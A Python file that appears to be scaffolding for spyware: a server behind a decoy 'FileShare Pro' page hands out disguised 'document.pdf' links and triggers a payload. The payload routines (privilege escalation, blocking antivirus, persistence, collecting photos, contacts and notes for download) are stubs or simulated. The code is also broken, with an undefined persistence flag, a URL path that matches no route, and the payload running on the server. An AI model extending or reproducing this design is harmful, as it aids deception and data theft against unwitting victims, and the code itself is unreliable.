import os
import sys
import platform
import subprocess
import secrets
import urllib.parse
import asyncio
from aiohttp import web
import zipfile
import io
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import ssl
import ctypes
import time
import threading
import json
from datetime import datetime, timedelta

# Configuration
SECRET_KEY = secrets.token_urlsafe(64)
LINK_EXPIRY_HOURS = 24
DATA_STORAGE_DIR = 'collected_data'

# Ensure the data storage directory exists
if not os.path.exists(DATA_STORAGE_DIR):
    os.makedirs(DATA_STORAGE_DIR)

class DeviceController:
    def __init__(self):
        self.lock_files = []
        self.processes = []
        self.blocking_active = False
        
    def escalate_privileges(self):
        # Implement privilege escalation (example: sudo commands, setuid)
        pass
    
    def block_system_functions(self):
        # Block specific system functions like task manager or antivirus
        pass
    
    def create_persistence(self):
        # Code for creating persistence (e.g., adding itself to startup)
        pass
    
    def collect_data(self):
        # Collect sensitive data like photos, contacts, notes, emails, etc.
        # Here we simulate the data collection by writing to a zip file

        collected_files = []
        # Simulating some collected data (e.g., fake data or files)
        collected_files.append(('photos/photo1.jpg', b'fake image data'))
        collected_files.append(('contacts/contacts.json', b'{"contacts": ["John Doe", "Jane Smith"]}'))
        collected_files.append(('notes/notes.txt', b'Fake notes data'))
        
        # Store collected data in a zip file
        zip_file_path = os.path.join(DATA_STORAGE_DIR, f"collected_data_{secrets.token_urlsafe(8)}.zip")
        with zipfile.ZipFile(zip_file_path, 'w') as zipf:
            for file_name, data in collected_files:
                zipf.writestr(file_name, data)
        return zip_file_path


class StealthWebServer:
    def __init__(self):
        self.app = web.Application()
        self.payloads = {}
        self.setup_routes()
        self.ssl_context = self.create_ssl_context()

    def create_ssl_context(self):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain('cert.pem', 'key.pem')
        return context

    def setup_routes(self):
        self.app.router.add_get('/generate', self.generate_payload)
        self.app.router.add_get('/p/{payload_id}', self.execute_payload)
        self.app.router.add_get('/download/{file_name}', self.download_data)
        self.app.router.add_get('/', self.decoy_page)

    async def decoy_page(self, request):
        return web.Response(text="Welcome to FileShare Pro", content_type='text/html')

    async def generate_payload(self, request):
        auth = request.headers.get('X-Auth-Key')
        if auth != SECRET_KEY:
            return web.json_response({"error": "Unauthorized"}, status=403)
        payload_id = secrets.token_urlsafe(16)
        self.payloads[payload_id] = {
            'created': datetime.now(),
            'executed': False
        }
        infected_url = f"https://{request.host}/p/{payload_id}/download?file=document.pdf"
        return web.json_response({"url": infected_url})

    async def execute_payload(self, request):
        payload_id = request.match_info['payload_id']
        if payload_id not in self.payloads:
            return web.Response(text="File not found", status=404)
        if self.payloads[payload_id]['executed']:
            return web.Response(text="File unavailable", status=410)
        self.payloads[payload_id]['executed'] = True
        controller = DeviceController()
        threading.Thread(target=self.run_payload, args=(controller,)).start()
        return web.Response(
            body=b'File corrupted during download',
            content_type='application/pdf',
            headers={'Content-Disposition': 'attachment; filename="document.pdf"'}
        )

    def run_payload(self, controller):
        time.sleep(5)
        controller.escalate_privileges()
        controller.block_system_functions()
        if PERSISTENCE_MECHANISM:
            controller.create_persistence()
        zip_file_path = controller.collect_data()
        self.payloads[zip_file_path] = {
            'created': datetime.now(),
            'executed': True
        }

    async def download_data(self, request):
        file_name = request.match_info['file_name']
        file_path = os.path.join(DATA_STORAGE_DIR, file_name)

        if not os.path.exists(file_path):
            return web.Response(text="File not found", status=404)

        with open(file_path, 'rb') as f:
            file_data = f.read()

        return web.Response(
            body=file_data,
            content_type='application/zip',
            headers={'Content-Disposition': f'attachment; filename="{file_name}"'}
        )

    async def cleanup_task(self):
        while True:
            await asyncio.sleep(3600)
            now = datetime.now()
            expired = [pid for pid, p in self.payloads.items() 
                      if (now - p['created']) > timedelta(hours=LINK_EXPIRY_HOURS)]
            for pid in expired:
                del self.payloads[pid]

    async def start_server(self):
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', 443, ssl_context=self.ssl_context)
        await site.start()
        asyncio.create_task(self.cleanup_task())
        print(f"Server running at https://0.0.0.0:443")
        print(f"Admin Key: {SECRET_KEY}")
        print("Generated links will look like:")
        print("https://your-domain.com/p/ABCDEF123/download?file=document.pdf")


if __name__ == '__main__':
    if not os.path.exists('cert.pem'):
        subprocess.run([
            'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
            '-keyout', 'key.pem', '-out', 'cert.pem',
            '-days', '365', '-nodes', '-subj', '/CN=localhost'
        ], check=True)
    server = StealthWebServer()
    try:
        asyncio.run(server.start_server())
    except KeyboardInterrupt:
        print("\nServer shutting down...")